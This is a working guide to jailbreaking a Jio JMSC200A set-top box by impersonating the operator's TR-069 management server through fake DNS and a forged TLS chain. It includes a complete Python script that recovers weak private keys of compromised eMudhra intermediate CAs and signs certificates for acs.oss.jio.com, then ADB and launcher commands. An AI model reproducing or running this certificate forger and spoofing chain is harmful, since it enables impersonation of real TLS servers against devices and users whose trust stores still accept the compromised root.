# Jio STB (JHS Series / JMSC200A) — Complete Master Guide
### ADB Enable + Monet Launcher + App Install — Full Working Record

This guide is a record of the entire process that has **already been successfully completed** on your JHS-series (JioOS 2.0) Jio STB. It contains every step, every command, expected output, and fixes for every error that came up. If you ever need to redo this (new STB, reset after an OTA update, etc.), just follow this guide.

**Your device:** JMSC200A / JHS series, Android 11, 32-bit
**STB IP (in this setup):** 192.168.2.187
**PC's LAN IP (in this setup):** 192.168.2.202

---

## Requirements (one-time install)

| Tool | Purpose | Source |
|---|---|---|
| Docker Desktop | Runs the GenieACS + MongoDB backend | docker.com |
| Python 3 | Runs the certificate-forging script | python.org (check "Add to PATH") |
| Technitium DNS | Local fake DNS server | technitium.com |
| Git for Windows | Provides the Git Bash terminal | gitforwindows.org |
| Platform-Tools (ADB) | adb.exe | Android Developer site |
| sideload-jiostb repo | The full exploit toolkit | GitHub ZIP, extracted into Downloads |

---

## PHASE 1: Network Setup (PC + STB)

### Step 1: Find Your PC's IP Address
```
ipconfig
```
Note down the **IPv4 Address** under "Wireless LAN adapter Wi-Fi" (e.g., `192.168.2.202`). You'll use this repeatedly throughout the process.

### Step 2: Turn Off Windows Firewall
`Win + R` → `firewall.cpl` → **Turn Windows Defender Firewall on or off** → turn **Off** for both Private and Public → OK.

**Why:** The firewall blocks incoming traffic from the STB on port 53 (DNS), ports 8443/9443 (TLS proxy), and port 7547 (TR-069).

### Step 3: Disable IPv6 on Your PC
`Win + R` → `ncpa.cpl` → right-click your active Wi-Fi → **Properties** → untick **Internet Protocol Version 6 (TCP/IPv6)** → OK.

**Why:** If IPv6 stays on, Windows will ignore your fake local DNS (Technitium) and use the router's IPv6 DNS instead, which resolves to the real Jio IP — the fake server won't work.

### Step 4: Set a Static DNS on the STB (USB bug method)
1. Plug a blank USB pendrive into the STB.
2. Boot the STB → **My Music** → **Settings** → **Eject USB**.
3. Open **Internal Storage** → **Apps** → stock **Settings** (gear icon).
4. Go to **Network** → your Wi-Fi → **Advanced IP Settings**.
5. Change IP Settings from **DHCP to Static**.
6. Leave IP, Gateway, Subnet, and DNS 2 unchanged. Set **DNS 1** to your **PC's IPv4** (from Step 1).
7. Save.

> ⚠️ If the IP/Gateway fields clear themselves when you select Static: switch back to DHCP first, note the values, then switch to Static and re-enter them manually.

---

## PHASE 2: Fix the Python Script Bug (one-time)

The toolkit's `forge_emudhra_chain.py` file had a bug that caused crashes while downloading the certificate from the internet (`AttributeError`, then `MalformedFraming`, then `TabError`). All of that has been fixed — use the final corrected file below.

1. Open the folder: `jhsc200-sideload-main\jhs`
2. Right-click `forge_emudhra_chain.py` → **Open with Notepad**.
3. Select all and delete everything.
4. Paste the complete file given below, then save with **Ctrl+S**.

```python
#!/usr/bin/env python3
"""
forge_emudhra_chain.py — mint a forged ACS certificate for a Jio STB.

WHY
    Jio's real ACS cert chains to their private sub-CA (RILSUBCA01 -> RILROOTCA),
    which we cannot forge. JHS-series boxes validate the chain against the system
    trust store and do NOT pin RILROOTCA, so any chain anchored on a root the box
    already trusts is accepted.

    In October 2026 eight eMudhra intermediate CA private keys were disclosed. They
    were weakly generated (P-384 scalars of 4, 56, 66, 115, 155, 156, 230, 237),
    so anyone can recompute them from the public certificate. One of those
    intermediates is cross-signed by Sectigo's "AAA Certificate Services" root,
    which is present in frozen pre-2021 trust stores -- exactly what an embedded
    box with a 2024 system image has.

WHAT IT DOES
    1. Fetches the compromised intermediate (or reads a local copy of it).
    2. Brute-forces the scalar d in 1..255 against its P-384 public key.
    3. Signs a leaf for --host with that key.
    4. Writes one PEM file: leaf + intermediate + leaf private key, which is what
       pass_front.py's ssl.SSLContext.load_cert_chain() wants.

USAGE
    pip install cryptography
    python3 jhs/forge_emudhra_chain.py
        --host NAME      subject/SAN for the leaf (default acs.oss.jio.com)
        --out PATH       output chain file (default /tmp/forged_chain.pem)
        --int-pem PATH   use a local intermediate cert instead of fetching
        --start YYYY-MM-DD  leaf notBefore (default: intermediate notBefore + 1 day)
        --end YYYY-MM-DD    leaf notAfter (default: intermediate notAfter - 1 day)

    NOTE ON DATES: keep the leaf INSIDE the intermediate's validity window. A box
    with a stale RTC (common after cold power-cycles with no NTP) rejects a leaf
    whose notBefore is in its future with SSLV3_ALERT_CERTIFICATE_EXPIRED. Widening
    the leaf to span the intermediate's whole window is what finally worked.
"""

import argparse
import datetime
import socket
import ssl
import sys

try:
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.x509.oid import NameOID
except ImportError:
    sys.exit("This script needs the 'cryptography' package: pip install cryptography")

# Public test host maintained by the researchers; it serves a chain built from the
# compromised intermediate so anyone can pull it down.
TEST_HOST = "dv-g3b-aaa-emudhra.we-have-a-problem.com"
TEST_PORT = 443

# Published scalar for EM DV TLS CA - G3B. Cross-check only, not used for recovery.
EXPECTED_D = 156


def _aware(value):
    """Return a UTC-aware datetime regardless of old/new cryptography versions."""
    return value if value.tzinfo else value.replace(tzinfo=datetime.timezone.utc)


def not_before(cert):
    return _aware(getattr(cert, "not_valid_before_utc", cert.not_valid_before))


def not_after(cert):
    return _aware(getattr(cert, "not_valid_after_utc", cert.not_valid_after))


def fetch_intermediate():
    """Return the intermediate from the public test host's chain."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    with ctx.wrap_socket(
        socket.create_connection((TEST_HOST, TEST_PORT), timeout=20), server_hostname=TEST_HOST
    ) as s:
        try:
            chain = s.get_verified_chain()  # Python 3.13+
        except AttributeError:
            return fetch_intermediate_openssl()
        return chain[1]


def fetch_intermediate_openssl():
    """Python < 3.13 fallback: shell out to openssl s_client -showcerts."""
    import re
    import subprocess

    cmd = [
        "openssl", "s_client",
        "-connect", f"{TEST_HOST}:{TEST_PORT}",
        "-servername", TEST_HOST,
        "-showcerts",
    ]
    try:
        out = subprocess.run(
            cmd, input="", capture_output=True, text=True, timeout=60, check=False
        ).stdout
    except FileNotFoundError:
        sys.exit(
            "This Python is too old to read the chain and 'openssl' was not found.\n"
            f"Save the intermediate manually: openssl s_client -connect {TEST_HOST}:443 "
            "-showcerts\nthen pass the second cert to --int-pem."
        )
    certs = re.findall(r"-----BEGIN CERTIFICATE-----\n.*?-----END CERTIFICATE-----", out, re.S)
    if len(certs) < 2:
        sys.exit(
            "Could not retrieve the intermediate certificate from "
            f"{TEST_HOST}:{TEST_PORT}.\nSave it manually: openssl s_client -connect "
            f"{TEST_HOST}:443 -showcerts\nthen pass the second cert to --int-pem."
        )
    return x509.load_pem_x509_certificate(certs[1].encode())


def recover_scalar(int_pub):
    """The compromised keys are scalars < 256; recover by brute force."""
    target = int_pub.public_numbers()
    for d in range(1, 256):
        cand = ec.derive_private_key(d, ec.SECP384R1()).public_key().public_numbers()
        if cand.x == target.x and cand.y == target.y:
            return d
    return None


def mint_leaf(int_cert, int_key, host, not_before, not_after):
    leaf_key = ec.generate_private_key(ec.SECP256R1())
    leaf = (
        x509.CertificateBuilder()
        .subject_name(
            x509.Name(
                [
                    x509.NameAttribute(NameOID.COUNTRY_NAME, "IN"),
                    x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Jio Platforms Ltd"),
                    x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, "RJIL"),
                    x509.NameAttribute(NameOID.COMMON_NAME, host),
                ]
            )
        )
        .issuer_name(int_cert.subject)
        .public_key(leaf_key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(not_before)
        .not_valid_after(not_after)
        .add_extension(x509.SubjectAlternativeName([x509.DNSName(host)]), critical=False)
        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
        .add_extension(
            x509.KeyUsage(
                digital_signature=True,
                content_commitment=False,
                key_encipherment=True,
                data_encipherment=False,
                key_agreement=False,
                key_cert_sign=False,
                crl_sign=False,
                encipher_only=False,
                decipher_only=False,
            ),
            critical=True,
        )
        .add_extension(
            x509.ExtendedKeyUsage([x509.oid.ExtendedKeyUsageOID.SERVER_AUTH]), critical=False
        )
        .sign(int_key, hashes.SHA384())
    )
    return leaf, leaf_key


def main():
    ap = argparse.ArgumentParser(description="Forge an ACS cert signed by the weak eMudhra key")
    ap.add_argument("--host", default="acs.oss.jio.com")
    ap.add_argument("--out", default="/tmp/forged_chain.pem")
    ap.add_argument("--int-pem", default=None, help="local PEM of the compromised intermediate")
    ap.add_argument("--start", default=None, help="YYYY-MM-DD (default: int notBefore + 1d)")
    ap.add_argument("--end", default=None, help="YYYY-MM-DD (default: int notAfter - 1d)")
    args = ap.parse_args()

    if args.int_pem:
        int_cert = x509.load_pem_x509_certificate(open(args.int_pem, "rb").read())
    else:
        print(f"[*] fetching intermediate from {TEST_HOST}:{TEST_PORT} ...")
        int_cert = fetch_intermediate()

    # SAFELY PARSE THE CERTIFICATE WHETHER IT DOWNLOADS AS BYTES (DER/PEM) OR RETURNS AN OBJECT
    if isinstance(int_cert, bytes):
        if int_cert.startswith(b'\x30'):
            int_cert = x509.load_der_x509_certificate(int_cert)
        else:
            int_cert = x509.load_pem_x509_certificate(int_cert)

    int_nb = not_before(int_cert)
    int_na = not_after(int_cert)
    print(f"[*] intermediate : {int_cert.subject.rfc4514_string()}")
    print(f"[*] its validity : {int_nb} -> {int_na}")
    print(f"[*] its sig alg  : {int_cert.signature_algorithm_oid.dotted_string}")

    d = recover_scalar(int_cert.public_key())
    if d is None:
        sys.exit(
            "[!] scalar not found in 1..255 -- this intermediate is not one of the\n"
            "    compromised eight, or the wrong cert was pulled."
        )
    print(f"[+] RECOVERED private key: d = {d}")
    if d == EXPECTED_D:
        print(f"[+] matches the published value for EM DV TLS CA - G3B ({EXPECTED_D})")

    int_key = ec.derive_private_key(d, ec.SECP384R1())

    def parse_date(s, default):
        if not s:
            return default
        return datetime.datetime.strptime(s, "%Y-%m-%d").replace(tzinfo=datetime.timezone.utc)

    nb = parse_date(args.start, int_nb + datetime.timedelta(days=1))
    na = parse_date(args.end, int_na - datetime.timedelta(days=1))
    if not (int_nb < nb < na < int_na):
        sys.exit(
            f"[!] leaf window {nb} -> {na} is not inside the intermediate's validity.\n"
            "    Any client that checks intermediate dates will reject it."
        )

    leaf, leaf_key = mint_leaf(int_cert, int_key, args.host, nb, na)

    # Sanity-check the signature chain before handing it to a live box.
    verifier = int_cert.public_key()
    verifier.verify(
        leaf.signature, leaf.tbs_certificate_bytes, ec.ECDSA(hashes.SHA384())
    )

    lp = leaf.public_bytes(serialization.Encoding.PEM).decode()
    ip = int_cert.public_bytes(serialization.Encoding.PEM).decode()
    kp = leaf_key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.TraditionalOpenSSL,
        serialization.NoEncryption(),
    ).decode()

    with open(args.out, "w") as f:
        f.write(lp + ip + kp)

    print(f"[+] leaf CN={args.host} SAN={args.host} valid {nb} -> {na}")
    print(f"[+] chain written to {args.out} (leaf + intermediate + key)")
    print(f"[+] serve it with: TLS_CERT={args.out} ./jhs/run_acs.sh")
    print()
    print("Reminder: this works only because the box's trust store contains Sectigo")
    print("AAA Certificate Services and checks neither revocation nor CT. Browsers")
    print("blocklist these intermediates; embedded devices never got that update.")


if __name__ == "__main__":
    main()
```

---

## PHASE 3: Start the Fake ACS Server

**Important: your router's internet must be ON during this phase** (to download the certificate).

### Step 5: Start the Docker Containers
1. Open Docker Desktop, wait until it says "Running" (green).
2. Open the folder `jhsc200-sideload-main\tls`, type `cmd` in the address bar, press Enter.
3. Run:
```
docker-compose up -d
```
**Expected output:** the first time, it will download images; it ends with `Started`/`Running`.

### Step 6: Set Up Technitium DNS
1. Open `http://localhost:5380` in your browser.
2. **Zones → Add Zone**: Zone Name = `jio.com`, Type = `Primary Zone`.
3. Inside the zone, click **Add Record**: Name = `acs.oss`, Type = `A`, IP = your PC's IPv4 (Step 1).
4. Save, make sure the zone is Enabled.

### Step 7: Start the Proxy Listener (Window #1)
1. In the main folder `jhsc200-sideload-main`, right-click empty space → **Open Git Bash here**.
2. Run:
```
./jhs/run_acs.sh
```
**Expected output:**
```
✓ minting forged chain -> .../tls/forged_chain.pem
[*] fetching intermediate from dv-g3b-aaa-emudhra...
[+] RECOVERED private key: d = 156
[+] chain written to ... (leaf + intermediate + key)
[+] serve it with: TLS_CERT=... ./jhs/run_acs.sh
```
**Do not close this window** — it will wait for the STB.

---

## PHASE 4: The Final Jailbreak

### Step 8: Unplug the Internet Cable (Critical)
Unplug the **Fiber/WAN cable** from the back of your router. The router stays on, but the internet goes down. STB and PC both stay connected over Wi-Fi.

### Step 9: Run the Main Script (Window #2 — new window)
1. In the main folder, right-click again → **Open Git Bash here** (a second window).
2. Run:
```
./stage1.sh --list-devices
```
**Expected output (the first time):**
```
[1/6] Checking prerequisites...
✓ TLS front-end already listening on :8443 + :9443
[2/6] Finding device in GenieACS...
  No devices found in GenieACS.
  Note: The STB only connects on boot...
```

### Step 10: Cold-Reboot the STB
As soon as the command runs: **unplug the STB's power adapter from the wall** (not remote standby), wait 5 seconds, plug it back in.

**Expected output (once the STB connects):**
```
✓ Auto-selected device: 98C9BE-JMSC200A-RVVSBILB1121062
[3/6] Refreshing device data model...
✓ refreshObject (full tree) — queued for next Inform
[4/6] Queuing TR-069 tasks...
✓ Enable USB Debugging — queued for next Inform
✓ Set Debug Validity (2037) — already in queue, skipping duplicate
✓ Disable FOTA + Enable Downgrade — already in queue, skipping duplicate
```

### Step 11: ADB Connect + Allow on TV
```
adb connect 192.168.2.187:5555
```
Getting `failed to authenticate` the first time is **normal** — it means the connection was made, you just haven't allowed it on the TV yet.

A **"Allow USB Debugging?"** popup will appear on the TV screen → tick **"Always allow from this computer"** with the remote and select OK.

Then check:
```
adb devices
```
**Expected output:**
```
List of devices attached
192.168.2.187:5555     device
```

### Step 12: Install the Launcher (final command)
```
./stage1.sh --skip-prereqs --stb-ip 192.168.2.187
```
This installs Monet Launcher, suspends the stock launcher, and disables boot ads.

---

## PHASE 5: Cleanup (once everything is done)

1. Plug the internet/fiber cable back into the router.
2. In Window #1 (listener), press `Ctrl + C`.
3. In Window #2, run:
```
docker compose down
```
4. Turn Windows Firewall back on via `firewall.cpl`.
5. Optionally turn IPv6 back on via `ncpa.cpl`.
6. Quit Docker Desktop (from the system tray).

---

## PHASE 6: Making Monet Launcher Permanently Default

(If the stock Jio launcher comes back after a reboot)

```
adb shell cmd package query-activities --brief -a android.intent.action.MAIN -c android.intent.category.HOME
adb shell cmd package set-home-activity com.klevico.monet/.HomeActivity
adb shell pm disable-user --user 0 com.techgenius.tvoslauncher
adb shell pm disable-user --user 0 com.jio.stb.hotellauncher
```

**If the Jio launcher gets re-enabled even after disabling it** (a Jio system service can bring it back), **uninstall it instead** (it stays in the system image, so it's safe):
```
adb shell pm uninstall -k --user 0 com.iwedia.ui.rjio.launcher.reliance
adb shell cmd package set-home-activity com.klevico.monet/.HomeActivity
adb reboot
```

**To bring it back later if needed:**
```
adb shell cmd package install-existing com.iwedia.ui.rjio.launcher.reliance
```

**Commands to check status:**
```
adb shell pm list packages -d | findstr -i launcher
adb shell pm list packages -e | findstr -i iwedia
adb shell dumpsys activity activities | findstr -i mResumedActivity
```

---

## PHASE 7: Installing Apps (APKs)

> **Important:** This STB's built-in package installer doesn't work (store apps get stuck on "installing"). One-click installs from the store (Uptodown/Aptoide/APKMirror) **will not work**. Only ADB installs are reliable.

### Method A: ADB from PC (most reliable)
```
adb connect 192.168.2.187:5555
adb install -r "C:\path\to\app.apk"
```

### Method B: One-click drag-and-drop tool (avoid retyping CMD commands)
Create this script: `install_apk_loop.bat`
```bat
@echo off
title APK Installer
cd /d "C:\Users\GOD\Downloads\Compressed\platform-tools-latest-windows\platform-tools"
adb connect 192.168.2.187:5555

if not "%~1"=="" (
  for %%a in (%*) do adb install -r "%%~a"
)

:loop
echo.
echo ================================================================
echo Drag-drop the APK file(s) into this window or paste the path,
echo then press Enter. Close the window to stop.
echo ================================================================
set "f="
set /p "f=> "
if not defined f goto loop
for %%a in (%f%) do adb install -r "%%~a"
goto loop
```
Double-click it, then drag-drop any APK into the window — multiple apps will install one after another as long as the window stays open.

### Method C (install directly on the STB, no PC needed — if you have Shevery/terminal)
Download the APK from a store (e.g., Uptodown), then in Shevery's terminal or `adb shell`:
```
cp /sdcard/Download/appname.apk /data/local/tmp/app.apk
pm install -r /data/local/tmp/app.apk
rm /data/local/tmp/app.apk
```
**Why a direct install from `/sdcard/` fails:** `pm install` is run by Android's system_server, which (due to an SELinux restriction) can't read files on `/sdcard` (a fuse filesystem). The file has to be copied to `/data/local/tmp/` first.

---

## PHASE 8: Making ADB Work From Anywhere (adding it to PATH)

To avoid navigating to the platform-tools folder every time:

1. Windows search → **"Edit environment variables for your account"**.
2. **User variables → Path → Edit → New**.
3. Paste:
```
C:\Users\GOD\Downloads\Compressed\platform-tools-latest-windows\platform-tools
```
4. OK → OK → OK. Open a **new CMD window**, check:
```
adb version
```

> It's better to move the platform-tools folder out of `Downloads\Compressed\...` into a simple fixed location like `C:\platform-tools`, so PATH never breaks if the folder is moved or deleted.

---

## ⚠️ Common Errors and Their Fixes

| Error | Cause | Fix |
|---|---|---|
| `[WARN] DNS acs.oss.jio.com -> 49.40.8.93` | PC is using IPv6/router DNS instead of Technitium | Disable IPv6 (`ncpa.cpl`), run `ipconfig /flushdns` |
| `No devices found in GenieACS` (repeatedly) | STB's time/date got messed up (from rebooting without internet), or DNS got reset | Turn on internet so the STB's clock syncs, reset DNS 1, then turn internet off again and reboot |
| `AttributeError: 'bytes' object has no attribute 'not_valid_before'` | Old buggy script | Use the corrected file from Phase 2 |
| `ValueError: Unable to load PEM file ... MalformedFraming` | Certificate came back as DER, PEM was expected | Use the corrected file from Phase 2 (handles both formats) |
| `TabError: inconsistent use of tabs and spaces` | Indentation broke while pasting code into Notepad | Copy-paste the entire file in one go, don't edit it manually |
| `failed to authenticate` on `adb connect` | Normal — you just haven't pressed "Allow" on the TV yet | Check the TV screen, tap OK/Allow on the popup, then run `adb connect` again |
| `docker-compose up -d` gives `dial tcp: lookup registry-1.docker.io: no such host` | The internet cable was unplugged while Docker tried to download images | Plug the internet back in, run `docker-compose up -d` again, then unplug it |
| Store install gets stuck on "installing" | Jio has modified/restricted the system package installer | Don't install from the store — use ADB (`adb install`) or Shevery + `pm install` |
| `INSTALL_FAILED_NO_MATCHING_ABIS` | The APK is 64-bit-only, this STB is 32-bit | Find the 32-bit (armeabi-v7a) version of that app |
| Stock Jio launcher comes back when pressing Home | A Jio service re-enables it even after disabling | Use `pm uninstall -k --user 0` instead of disabling |
| Wireless ADB/Shizuku stops working after a reboot | Wireless ADB and Shizuku sessions reset on reboot | Run `adb connect <IP>:5555` again after every reboot |

---

## Quick Reference: Most-Used Commands

```
# Connect
adb connect 192.168.2.187:5555
adb devices

# Install an app
adb install -r "C:\path\app.apk"

# Make Monet the default launcher
adb shell cmd package set-home-activity com.klevico.monet/.HomeActivity

# Remove the stock Jio launcher
adb shell pm uninstall -k --user 0 com.iwedia.ui.rjio.launcher.reliance

# Reboot
adb reboot

# Check storage
adb shell df -h
adb shell ls -la /sdcard/Download/

# Send/pull a file
adb push "C:\path\file" /sdcard/Download/
adb pull /sdcard/Download/file "C:\path\"
```
